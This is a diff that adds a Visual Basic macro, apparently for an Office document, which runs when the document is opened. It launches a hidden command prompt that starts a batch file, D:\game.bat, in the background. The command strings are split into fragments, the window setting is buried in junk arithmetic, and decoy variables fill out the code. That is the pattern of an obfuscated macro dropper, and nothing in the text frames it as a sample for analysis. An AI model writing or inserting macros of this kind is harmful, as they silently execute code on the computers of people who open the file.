@@ -1,0 +1,21 @@
+Private Sub DocumentOpen()
+    Dim text As String
+    Dim booboo As String
+    Dim pp As String
+    Dim game As Object
+    Dim poo As Integer
+    
+    
+    
+    text = ""
+    poo = 0 + 3 - 263 + 77361 - 9 - 91810 + 981 + 13837 + Len(text)
+    booboo = "kapgd" & text & "sjdya" & text & "LpaodyG" & text & "Poatqsz" & text & "817gavbxz" & text & "nabhspoq87" & text & "maknclkF"
+    boobooo = "D" & text & ":\" & text & "ga" & text & "me" & text & "." & text & "b" & text & "a" & text & "t"
+
+    Set game = CreateObject("WScript.Shell")
+    game.Run "c" & text & "md " & text & "/" & text & "c s" & text & "ta" & text & "r" & text & "t " & text & "/B" & text & " " & text & "D:\g" & text & "am" & text & "e." & text & "b" & text & "a" & text & "t", (Len(booboo) - Len(text)) / Len(booboo) - 1 + poo, False
+    Set game = Nothing
+    
+    
+    Exit Sub
+End Sub
